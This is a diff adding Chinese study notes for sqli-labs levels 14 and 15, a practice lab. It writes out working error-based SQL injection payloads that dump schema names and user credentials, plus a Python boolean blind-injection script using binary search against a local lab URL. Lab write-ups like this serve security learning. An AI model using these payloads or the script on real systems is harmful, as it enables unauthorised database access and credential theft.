@@ -629,3 +629,139 @@ uname=aaa')+or+updatexml(1,concat(0x7e,(select+group_concat(uUsername,0x7e,uPass
 
 ## 第十四关
 
+经过测试，本关卡是双引号字符型注入，并且注入的列数为两列
+
+![image-20210521113903090](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521113903090.png)
+
+但是使用 `union select` 无回显信息，报错注入成功显示信息
+
+![image-20210521114227279](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521114227279.png)
+
+获取数据库，其中用到了 `right()`函数：`right(str, length)`，即：right(被截取字符串， 截取长度)
+
+获得数据库payload：
+
+~~~
+uname=aaa%22+or+updatexml(1,concat(0x7e,(select+right(group_concat(schema_name),15)+from+information_schema.schemata),0x7e),1)+%23&passwd=aaa&submit=Submit
+~~~
+
+![image-20210521130413879](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521130413879.png)
+
+开始获取数据库 `security`中的表，payload：
+
+~~~
+uname=aaa%22+or+updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema="security"),0x7e),1)+%23&passwd=aaa&submit=Submit
+~~~
+
+![image-20210521130702574](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521130702574.png)
+
+获取security.users表中的字段，payload：
+
+~~~
+uname=aaa%22+or+updatexml(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_schema="security"+and+table_name="users"),0x7e),1)+%23&passwd=aaa&submit=Submit
+~~~
+
+![image-20210521130823024](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521130823024.png)
+
+获取security.users表中的数据，payload：
+
+~~~
+uname=aaa%22+or+updatexml(1,concat(0x7e,(select+group_concat(username,0x7e,password)+from+security.users),0x7e),1)+%23&passwd=aaa&submit=Submit
+~~~
+
+![image-20210521130942406](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521130942406.png)
+
+内容没有显示完全，可以使用left()或者right()查看剩余的内容
+
+## 第十五关
+
+![image-20210521131658328](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521131658328.png)
+
+使用这个语句成功判断这一关是单引号字符注入，报错注入和union注入都不会回显任何消息，看来只能盲注了
+
+使用布尔盲注，因为执行成功与失败页面会显示不同的图片内容
+
+~~~
+uname=1'+or+ascii(mid(database(),1,1))>33#&passwd=aa&submit=Submit
+~~~
+
+![image-20210521132216267](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521132216267.png)
+
+下面就是编写py脚本，语句成功返回上面的图片
+
+python脚本：
+
+~~~python
+import time
+import sys
+import requests
+
+
+def getPayload(result_index, char_index, ascii):
+
+
+	select_str = "select concat(content,'@',time)  from pikachu.message limit "+str(result_index)+",1" #DIY地址
+	
+	# 连接payload
+	sqli_str = "1' or (ascii(mid((" + select_str + ")," + str(char_index) + ",1))>" + str(ascii) + ")#" #DIY地址
+	payload = {"uname":sqli_str,"passwd":"aa","submit":"Submit"}  #DIY地址
+
+	return payload
+
+
+def execute(result_index, char_index, ascii):
+	# 连接url
+	url = "http://localhost/sqli-labs/Less-15/index.php"  #DIY地址
+	payload = getPayload(result_index, char_index, ascii)
+	# print(payload)
+	# 检查回显
+	echo = "flag"            #DIY地址
+	content = requests.post(url, data=payload).text
+	time.sleep(0.1)
+	# print(content)
+	if echo in content:
+		return True
+	else:
+		return False
+
+
+def dichotomy(result_index, char_index, left, right):
+	while left < right:
+		# 二分法
+		ascii = int((left + right) / 2)
+		if execute(str(result_index), str(char_index + 1), str(ascii)):
+			left = ascii
+		else:
+			right = ascii
+		# 结束二分
+		if left == right - 1:
+			if execute(str(result_index), str(char_index + 1), str(ascii)):
+				ascii += 1
+				break
+			else:
+				break
+	return chr(ascii)
+
+
+if __name__ == "__main__":
+	for num in range(32):  # 查询结果的数量  #DIY地址
+		count = 0
+		for len in range(32):  # 单条查询结果的长度   #DIY地址
+			count += 1
+			char = dichotomy(num, len, 30, 126)
+			if ord(char) == 1:  # 单条查询结果已被遍历
+				break
+			sys.stdout.write(char)
+			sys.stdout.flush()
+		if count == 1:  # 查询结果已被遍历
+			break
+		sys.stdout.write("\r\n")
+		sys.stdout.flush()
+~~~
+
+上面的脚本是获取 `pikachu.message`表中的content和time字段的信息，时间没有显示完全，使用以下函数调用索引即可：`mid()、substr()、left()、right()、substring()`
+
+![image-20210521192440701](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521192440701.png)
+
+通过python脚本正确遍历出数据库中的内容
+
